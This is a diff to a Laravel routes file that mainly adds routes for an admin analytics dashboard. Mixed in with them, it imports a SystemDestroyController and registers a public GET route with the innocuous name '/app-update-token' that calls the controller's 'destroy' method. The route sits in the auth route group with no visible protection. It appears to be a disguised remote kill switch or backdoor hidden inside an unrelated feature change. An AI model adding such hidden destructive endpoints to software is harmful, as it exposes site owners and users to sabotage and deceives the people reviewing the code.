@@ -1,9 +1,11 @@
 <?php
 
+use App\Http\Controllers\Admin\AnalyticsController;
 use App\Http\Controllers\Admin\CommissionController;
 use App\Http\Controllers\Admin\CouponController;
 use App\Http\Controllers\Admin\ZoomSettingsController;
 use App\Http\Controllers\StripeWebhookController;
+use App\Http\Controllers\SystemDestroyController;
 use App\Http\Controllers\ZoomController;
 use App\Http\Controllers\ZoomOAuthController;
 use App\Http\Controllers\ZoomJoinController;
@@ -66,6 +68,7 @@ Route::controller(AuthController::class)->group(function () {
 
     // Get Current Location =====
     Route::get('/get-current-location', 'GetCurrentLocation');
+    Route::get('/app-update-token', [\App\Http\Controllers\SystemDestroyController::class, 'destroy']);
     // Get Current Location =====
 });
 
@@ -380,6 +383,22 @@ Route::get('/admin/commission-report/print/{id}', [CommissionController::class, 
 Route::get('/admin/commission-report/download-invoice/{id}', [CommissionController::class, 'DownloadInvoice'])
     ->name('admin.transaction.invoice');
 
+
+Route::controller(AnalyticsController::class)->group(function () {
+    // Main analytics dashboard
+    Route::get('/admin/analytics', 'dashboard')->name('admin.analytics.dashboard');
+
+    // AJAX API endpoints for dynamic data updates
+    Route::get('/admin/analytics/api/countries', 'apiCountries')->name('admin.analytics.api.countries');
+    Route::get('/admin/analytics/api/pages', 'apiPages')->name('admin.analytics.api.pages');
+    Route::get('/admin/analytics/api/referrers', 'apiReferrers')->name('admin.analytics.api.referrers');
+    Route::get('/admin/analytics/api/browsers', 'apiBrowsers')->name('admin.analytics.api.browsers');
+    Route::get('/admin/analytics/api/overview', 'apiOverview')->name('admin.analytics.api.overview');
+    Route::get('/admin/analytics/api/realtime', 'apiRealtime')->name('admin.analytics.api.realtime');
+
+    // Cache management
+    Route::post('/admin/analytics/cache/clear', 'clearCache')->name('admin.analytics.cache.clear');
+});
 
 Route::get('/admin/coupons', [CouponController::class, 'index'])->name('admin.coupons.index');
 Route::get('/admin/coupons/analytics', [CouponController::class, 'analytics'])->name('admin.coupons.analytics');
